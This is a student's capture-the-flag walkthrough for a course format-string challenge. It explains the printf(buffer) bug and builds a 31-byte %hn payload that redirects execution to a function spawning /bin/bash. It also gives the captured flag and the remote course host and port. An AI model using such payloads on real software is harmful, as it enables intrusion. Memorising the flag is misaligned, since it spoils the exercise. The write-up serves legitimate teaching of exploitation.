# formatstring4 Walkthrough (jump)

This challenge is a format-string exploit with a strict input cap, but it leaks everything we need.

## 1. Files and first look

- Binary: `jump`
- Source: `pwn4.c`

Core vulnerable line:

```c
fgets(buffer, sizeof(buffer), stdin);
printf(buffer);
```

So user input is used as a format string directly.

## 2. Important source observations

`pwn4.c` leaks two critical values before input is read:

```c
printf("Let me jump to the function %x, %x. Give me the code for teleport.\n", jump, &buffer);
```

It also prints bytes at `buffer[48..51]` before and after exploitation:

```c
printf("%x %x %x %x\n", buffer[48], buffer[49], buffer[50], buffer[51]);
...
printf("%x %x %x %x\n", buffer[48], buffer[49], buffer[50], buffer[51]);
```

Those bytes correspond to the saved return address in little-endian form.

## 3. Strategy

Goal: redirect execution to `jump()`.

`jump()` does:

```c
printf("fff");
system("/bin/bash");
```

We overwrite `main`'s saved return address with `jump` using `%hn` writes (2 bytes at a time) because input is only 32 bytes (`fgets(..., 32, ...)`).

## 4. Compute target pointers

From leak:

- `jump_addr` = leaked function address (for example `0x80491a6`)
- `buffer_addr` = leaked stack buffer address
- `ret_addr = buffer_addr + 48`

We place two 4-byte addresses at the front of our input:

- address #1 = `ret_addr + 2` (high 16 bits)
- address #2 = `ret_addr` (low 16 bits)

## 5. Compact payload under 32-byte limit

Target value is `0x080491a6`.

Halfwords:

- high = `0x0804` = 2052
- low = `0x91a6` = 37286

Payload shape:

```text
[ret+2][ret]%2044c%1$hn%35234c%2$hn
```

Why these paddings:

- 8 bytes are already "printed" from two addresses at payload start.
- First write needs total count 2052: `2052 - 8 = 2044` -> `%2044c`, then `%1$hn` writes `0x0804` to `ret+2`.
- Second write needs total count 37286: `37286 - 2052 = 35234` -> `%35234c`, then `%2$hn` writes `0x91a6` to `ret`.

Total payload length is exactly 31 bytes, so it fits in `fgets(..., 32, ...)`.

## 6. Local validation

Observed local output included:

- changed post-write bytes ending in `a6 91 4 8`
- marker `fff`

`fff` confirms control flow reached `jump()`.

## 7. Remote solve

Remote reachable port: `32150`.

Exploit sends:

1. 31-byte overwrite payload (no newline, so `fgets` consumes exactly 31 bytes)
2. `cat flag.txt\nexit\n` for the spawned `/bin/bash`

Verified remote result:

```text
fffcosc466-flag-{u3VyuWnP8GU3cHbnrCFu}
```

## 8. Final flag

`cosc466-flag-{u3VyuWnP8GU3cHbnrCFu}`

## 9. Repro commands

Local:

```bash
cd /home/jbenjam7/cs466/ctf/formatstring4
python3 exploit.py
```

Remote:

```bash
cd /home/jbenjam7/cs466/ctf/formatstring4
python3 exploit.py --remote --host moa6.eecs.utk.edu --port 32150
```
